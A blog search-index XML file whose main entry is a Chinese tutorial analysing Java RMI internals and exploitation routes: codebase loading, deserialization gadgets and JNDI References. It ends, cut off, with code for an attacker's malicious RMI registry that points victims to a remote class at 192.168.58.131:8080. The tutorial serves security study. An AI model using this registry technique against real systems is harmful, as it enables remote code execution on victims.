<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2020-26945 Mybatis远程代码执行漏洞复现</title>
      <link href="/2020/12/24/cve-2020-26945-mybatis-yuan-cheng-dai-ma-zhi-xing-lou-dong-fu-xian/"/>
      <url>/2020/12/24/cve-2020-26945-mybatis-yuan-cheng-dai-ma-zhi-xing-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaSec Tomcat内存Webshell分析</title>
      <link href="/2020/12/10/tomcat-nei-cun-webshell-fen-xi/"/>
      <url>/2020/12/10/tomcat-nei-cun-webshell-fen-xi/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaSec rmi利用分析</title>
      <link href="/2020/12/04/rmi-li-yong-fen-xi/"/>
      <url>/2020/12/04/rmi-li-yong-fen-xi/</url>
      
        <content type="html"><![CDATA[<p>在《JNDI注入利用分析》中支持，JNDI支持访问多种命名与目录服务，其中就有利用RMI达成RCE的目的。RMI（Remote Method Invocation）远程方法调用可以类比RPC，这里将以下要点总结RMI的利用原理：</p><blockquote><ol><li><p>RMI基本内容：通过demo代码理解RMI的使用流程</p></li><li><p>RMI原理分析：通过RMI源码分析，结合Wireshark流量分析RMI的实现，过程指出我们的利用点</p></li><li><p>RMI利用方式总结：分类总结随着JDK的升级阻断RMI的利用方式发展</p></li></ol></blockquote><h2 id="一、RMI基本内容"><a href="#一、RMI基本内容" class="headerlink" title="一、RMI基本内容"></a>一、RMI基本内容</h2><p>RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范（这里将在RMI原理分析中流量包体现），RMI中的对象传输以Java的反序列化方式编码，所以说RMI的利用总体还是Java不安全的反序列漏洞利用，也有RMI的协议独特的利用方式。</p><p>一个简单的例子：</p><p><code>Compute.java</code>: 生成远程对象接口</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>thonsun<span class="token punctuation">.</span>server<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>Remote<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @Project: test-poc * @Desc: * @Author: thonsun * @Create: 2020/12/25 12:17 **/</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Compute</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>RMIServer.java</code>：实现远程对象接口，并集成注册中心</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>thonsun<span class="token punctuation">.</span>server<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span>UnicastRemoteObject<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @Project: test-poc * @Desc: * @Author: thonsun * @Create: 2020/12/25 12:18 **/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIServer</span> <span class="token keyword">extends</span> <span class="token class-name">UnicastRemoteObject</span> <span class="token keyword">implements</span> <span class="token class-name">Compute</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">RMIServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"client call add("</span><span class="token operator">+</span>a<span class="token operator">+</span><span class="token string">","</span><span class="token operator">+</span>b<span class="token operator">+</span><span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> a<span class="token operator">+</span>b<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            String name <span class="token operator">=</span> <span class="token string">"Compute"</span><span class="token punctuation">;</span>            RMIServer rmiServer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RMIServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            registry<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>rmiServer<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"compute server bind ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RemoteException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"compute server bind exception"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>RMIClient.java</code>：实现客户端调用</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>thonsun<span class="token punctuation">.</span>client<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>thonsun<span class="token punctuation">.</span>server<span class="token punctuation">.</span>Compute<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>MalformedURLException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>Naming<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>NotBoundException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @Project: test-poc * @Desc: * @Author: thonsun * @Create: 2020/12/25 12:18 **/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> NotBoundException<span class="token punctuation">,</span> MalformedURLException <span class="token punctuation">{</span>        Compute comp <span class="token operator">=</span> <span class="token punctuation">(</span>Compute<span class="token punctuation">)</span> Naming<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://192.168.8.115:1099/Compute"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>comp<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><p>RMIServer：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201225123331320.png" alt="image-20201225123331320"></p><p>RMIClient：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201225123448275.png" alt="image-20201225123448275"></p><p>由上面例子一个RMI系统主要有三个组成部分：</p><p>1.client：调用者</p><p>2.server：被调用者，Remote Object的执行者</p><p>3.registry：注册中心，提供Remote Object的引用</p><p>在官方文档解析：</p><blockquote><p>Before a client can invoke a method on a remote object, it must first obtain a reference to the remote object. Obtaining a reference can be done in the same way that any other object reference is obtained in a program, such as by getting the reference as part of the return value of a method or as part of a data structure that contains such a reference.</p><p>The system provides a particular type of remote object, the RMI registry, for finding references to other remote objects. The RMI registry is a simple remote object naming service that enables clients to obtain a reference to a remote object by name. The registry is typically only used to locate the first remote object that an RMI client needs to use. That first remote object might then provide support for finding other objects.</p><p>The <code>java.rmi.registry.Registry</code> remote interface is the API for binding (or registering) and looking up remote objects in the registry. The <code>java.rmi.registry.LocateRegistry</code> class provides static methods for synthesizing a remote reference to a registry at a particular network address (host and port). These methods create the remote reference object containing the specified network address without performing any remote communication. <code>LocateRegistry</code> also provides static methods for creating a new registry in the current Java virtual machine, although this example does not use those methods. Once a remote object is registered with an RMI registry on the local host, clients on any host can look up the remote object by name, obtain its reference, and then invoke remote methods on the object. The registry can be shared by all servers running on a host, or an individual server process can create and use its own registry.</p></blockquote><p>意思是说client 通过获取的服务端远程对象的引用stub来与服务端远程对象交互，这个stub就像是在client端的远程对象代理。而client获取服务端远程引用stub是通过Registery（注册中心实际也是一个Remote Object的实现，这里的Registry 与 LocateRegistery的关系可以看出），解决了获取Remote Object Stub的问题。</p><p>文档还指出，远程方法调用的参数传递约定：</p><blockquote><p>The rules governing how arguments and return values are passed are as follows:</p><ul><li>Remote objects are essentially passed by reference. A <em>remote object reference</em> is a stub, which is a client-side proxy that implements the complete set of remote interfaces that the remote object implements.</li><li>Local objects are passed by copy, using object serialization. By default, all fields are copied except fields that are marked <code>static</code> or <code>transient</code>. Default serialization behavior can be overridden on a class-by-class basis.</li></ul></blockquote><p>意思是说<strong>客户端通过从Registery获取的远程对象的stub引用调用远程对象方法，方法的参数与方法的返回值以Java序列化数据编码传递。即远程对象的方法的参数与方法的返回值可是一基本类型，可序列化对象；</strong>当是可序列化对象的时候，这个对象的class文件必须是共同存在服务端or客户端的，或者如服务端不存在参数的类型，但服务端JVM允许远程codebase加载类（参考文献：<a href="https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/codebase.html" target="_blank" rel="noopener">Java Codebase技术</a>），客户端启动的时候指定codebase url调用服务端，此时服务端会从客户端codebase通过URLClassLoader加载类字节文件（这个就是其中一个利用点，但由于利用条件限制太多通常不用），这个流程将在下面分析</p><p>一个RMI程序整体流程：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201225115057036.png" alt="image-20201225115057036"></p><p>以RMI Remote Object调用为例讲解RMI系统工作过程：</p><p>1.服务端实现Remote Object接口，通过<code>UnicastRemoteObject.export()</code>创建本地skeleton与stub并将stub注册到RMIRegistry</p><p>2.客户端通过JNDI或者Naming lookup从RMIRegistry 获取Remote Object的引用stub</p><p>3.客户端通过本地远程代理对象stub与服务端skeleton通讯，以Java序列化编码传输参数与返回值</p><p>将有两个tcp的握手过程。</p><h2 id="二、RMI原理分析"><a href="#二、RMI原理分析" class="headerlink" title="二、RMI原理分析"></a>二、RMI原理分析</h2><p>这里以源码与流量层面对RMI的Remote Object 与 Reference进行原理分析</p><h3 id="2-1-RMI-Remote-Object"><a href="#2-1-RMI-Remote-Object" class="headerlink" title="2.1 RMI Remote Object"></a>2.1 RMI Remote Object</h3><p>demo程序以上面那个为例</p><p>1.远程对象RMIServer继承 <code>UnicastRemoteObject</code> 初始化通过exportObject创建Skeleton与stub</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201225160800343.png" alt="image-20201225160800343"></p><p>内部包含ref对象</p><p>2.创建Registry并注册Remote Object到Regitstery</p><p>通过debug可以看出Registry其实也是一个Remote Object</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201225161212018.png" alt="image-20201225161212018"></p><p>名称与RMIServer绑定</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201225161520969.png" alt="image-20201225161520969"></p><p>3.客户端获取stub</p><p>客户端通过Naming.lookup获取一个远程对象的引用，先解析获取到Registry的引用</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201225162018837.png" alt="image-20201225162018837"></p><p>在调用Registry的远程方法lookup查找指定名称的Server远程对象，可以看到Client –&gt; Registry是以Java反序列传输数据</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201225162438656.png" alt="image-20201225162438656"></p><p>从Regitstry反序列化获得Server Remote Object的代理类</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201225162959310.png" alt="image-20201225162959310"></p><p>通过Proxy代理调用远程方法返回结果</p><p>表现在流量层面：（为方便查看，服务端与客户端分开运行）</p><p>wireshark 流量抓取RMI Client通讯流量</p><p><code>ip.addr == 192.168.58.131 &amp;&amp; (ip.addr == 192.168.8.115 ||ip.addr == 172.31.2.167)</code></p><p>第一次TCP链接：Client与Registry建立连接获取Remote Object的引用（代理对象）；</p><p>Wireshark正确识别出是RMI的流量</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201225174452749.png" alt="image-20201225174452749"></p><p>获取到的Remote Object引用在JRMI ReturnData，以序列化字节流传输，通过<a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener">SerializationDumper</a> 可以查看序列化数据</p><pre class="line-numbers language-shell"><code class="language-shell">$ java -jar SerializationDumper.jar "aced0005770f019853d68c000001769940ab038005737d00000002000f6a6176612e726d692e52656d6f74650020636f6d2e74686f6e73756e2e64656d6f312e7365727665722e436f6d7075746570787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b7078707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c65720000000000000002020000707872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e0300007078707735000a556e6963617374526566000c3137322e33312e322e3136370000faa7ce7e561aa49bbf989853d68c000001769940ab0380010178"STREAM_MAGIC - 0xac edSTREAM_VERSION - 0x00 05Contents  TC_BLOCKDATA - 0x77    Length - 15 - 0x0f    Contents - 0x019853d68c000001769940ab038005  TC_OBJECT - 0x73    TC_PROXYCLASSDESC - 0x7d      newHandle 0x00 7e 00 00      Interface count - 2 - 0x00 00 00 02      proxyInterfaceNames        0:          Length - 15 - 0x00 0f          Value - java.rmi.Remote - 0x6a6176612e726d692e52656d6f7465        1:          Length - 32 - 0x00 20          Value - com.thonsun.demo1.server.Compute - 0x636f6d2e74686f6e73756e2e64656d6f312e7365727665722e436f6d70757465      classAnnotations        TC_NULL - 0x70        TC_ENDBLOCKDATA - 0x78      superClassDesc        TC_CLASSDESC - 0x72          className            Length - 23 - 0x00 17            Value - java.lang.reflect.Proxy - 0x6a6176612e6c616e672e7265666c6563742e50726f7879          serialVersionUID - 0xe1 27 da 20 cc 10 43 cb          newHandle 0x00 7e 00 01          classDescFlags - 0x02 - SC_SERIALIZABLE          fieldCount - 1 - 0x00 01          Fields            0:              Object - L - 0x4c              fieldName                Length - 1 - 0x00 01                Value - h - 0x68              className1                TC_STRING - 0x74                  newHandle 0x00 7e 00 02                  Length - 37 - 0x00 25                  Value - Ljava/lang/reflect/InvocationHandler; - 0x4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b          classAnnotations            TC_NULL - 0x70            TC_ENDBLOCKDATA - 0x78          superClassDesc            TC_NULL - 0x70    newHandle 0x00 7e 00 03    classdata      java.lang.reflect.Proxy        values          h            (object)              TC_OBJECT - 0x73                TC_CLASSDESC - 0x72                  className                    Length - 45 - 0x00 2d                    Value - java.rmi.server.RemoteObjectInvocationHandler - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572                  serialVersionUID - 0x00 00 00 00 00 00 00 02                  newHandle 0x00 7e 00 04                  classDescFlags - 0x02 - SC_SERIALIZABLE                  fieldCount - 0 - 0x00 00                  classAnnotations                    TC_NULL - 0x70                    TC_ENDBLOCKDATA - 0x78                  superClassDesc                    TC_CLASSDESC - 0x72                      className                        Length - 28 - 0x00 1c                        Value - java.rmi.server.RemoteObject - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374                      serialVersionUID - 0xd3 61 b4 91 0c 61 33 1e                      newHandle 0x00 7e 00 05                      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE                      fieldCount - 0 - 0x00 00                      classAnnotations                        TC_NULL - 0x70                        TC_ENDBLOCKDATA - 0x78                      superClassDesc                        TC_NULL - 0x70                newHandle 0x00 7e 00 06                classdata                  java.rmi.server.RemoteObject                    values                    objectAnnotation                      TC_BLOCKDATA - 0x77                        Length - 53 - 0x35                        Contents - 0x000a556e6963617374526566000c3137322e33312e322e3136370000faa7ce7e561aa49bbf989853d68c000001769940ab03800101                      TC_ENDBLOCKDATA - 0x78                  java.rmi.server.RemoteObjectInvocationHandler                    values      <Dynamic Proxy Class><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>这里注意classAnnotations，这个是下面利用RMI codebase的利用点</strong>，codebase将在这里指定</p><p>第二次TCP链接：Client获取的Remote Object本地代理与Server交互获得返回结果</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201225175920179.png" alt="image-20201225175920179"></p><p>对call 与 result的数据进行格式解释：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201225180033993.png" alt="image-20201225180033993"></p><p>对于Java序列化的格式参考 <a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html" target="_blank" rel="noopener">官网文档</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201225180829573.png" alt="image-20201225180829573"></p><p>即础数据类型的数据，如整数、浮点数等，会在流中使用blockdata格式进行表示。</p><p>这里Call &amp; ReturnData 后面可以看到参数2，3，5；</p><p><strong>这里可以提一下对于参数&amp;返回值是一个对象的时候，则是classdata的反序列形式，若本地JVM不存在class文件若满足可以加载远程codebase的运行条件（将在下面讨论）将从远程codebase下载class文件加载进行反序列化</strong>。</p><h3 id="2-2-RMI-Reference"><a href="#2-2-RMI-Reference" class="headerlink" title="2.2 RMI Reference"></a>2.2 RMI Reference</h3><p>这个流程放在RMI Reference讨论</p><h2 id="三、RMI利用方式"><a href="#三、RMI利用方式" class="headerlink" title="三、RMI利用方式"></a>三、RMI利用方式</h2><p>这里以利用方式进行分类叙述</p><h3 id="3-1-利用RMI威胁功能函数"><a href="#3-1-利用RMI威胁功能函数" class="headerlink" title="3.1 利用RMI威胁功能函数"></a>3.1 利用RMI威胁功能函数</h3><p>利用条件：</p><blockquote><p>远程对象存在威胁的函数：如写入文件内容到指定的文件位置，这个文件内容与文件位置攻击者可控，且是未授权访问</p></blockquote><p>通常是客户端攻击服务端，利用的是未授权这类漏洞，RMI只是提供一个服务访问接口，类似web的文件上传。</p><h3 id="3-2-利用RMI-codebase特性"><a href="#3-2-利用RMI-codebase特性" class="headerlink" title="3.2 利用RMI codebase特性"></a>3.2 利用RMI codebase特性</h3><p>利用条件：</p><blockquote><p>JVM 启动参数指定允许远程codebase加载class</p></blockquote><p>这个已经很难利用了,这是因为在JDK7u21、JDK6u45之后限制，只有满足下面条件才可以加载codebase 远程class反序列</p><p>1.安装设置SecurityManager</p><p>2.版本低于JDK7u21、JDK6u45或者设置JVM启动参数 <code>java.rmi.server.useCodebaseOnly=false</code>  </p><p>对codebase的理解：</p><blockquote><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p><p>如果我们指定 codebase=<a href="http://example.com/" target="_blank" rel="noopener">http://example.com/</a> ，然后加载 org.vulhub.example.Example 类，则Java虚拟机会下载这个文件 <a href="http://example.com/org/vulhub/example/Example.class" target="_blank" rel="noopener">http://example.com/org/vulhub/example/Example.class</a> ，并作为Example类的字节码。</p><p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。 </p></blockquote><h3 id="3-3-利用RMI参数为Object类型函数"><a href="#3-3-利用RMI参数为Object类型函数" class="headerlink" title="3.3 利用RMI参数为Object类型函数"></a>3.3 利用RMI参数为Object类型函数</h3><p>利用条件：</p><blockquote><p>1.对于远程对象A，有方法b,参数有类型为Object（可接受任意类型)的c，即A.b(c)</p><p>2.受害者JVM中存在利用链，如Apache Common Collections依赖</p></blockquote><p>这里可以是服务器攻击客户端，也可以是客户端攻击服务端，因为RMI的远程对象方法参数与返回值都是通过Java反序列化传输，服务端or客户端在接受到一个Object的参数会通过本地class.loadClass()加载本地Class进行newInstance，这之后走的是Java反序列漏洞利用。关于Java反序列化漏洞利用可参考上篇文章。</p><p>这里给出一个简单的利用demo</p><h3 id="3-4-利用RMI-Reference"><a href="#3-4-利用RMI-Reference" class="headerlink" title="3.4 利用RMI Reference"></a>3.4 利用RMI Reference</h3><p>攻击者起恶意的Registry：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>thonsun<span class="token punctuation">.</span>demo2<span class="token punctuation">.</span>registry<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>NamingException<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Reference<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>AlreadyBoundException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @Project: JavaSec * @Desc: 攻击者部署的恶意注册中心，返回执行payload的Reference绕过codebase限制与突破没有利用链的 * @Author: thonsun * @Create: 2020/12/25 18:25 **/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIRegistry</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> NamingException<span class="token punctuation">,</span> AlreadyBoundException <span class="token punctuation">{</span>        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Reference reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"ExecTest"</span><span class="token punctuation">,</span> <span class="token string">"ExecTest"</span><span class="token punctuation">,</span> <span class="token string">"http://192.168.58.131:8080/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ReferenceWrapper evil <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"evil"</span><span class="token punctuation">,</span>evil<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"bind ExecTest Reference Done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span 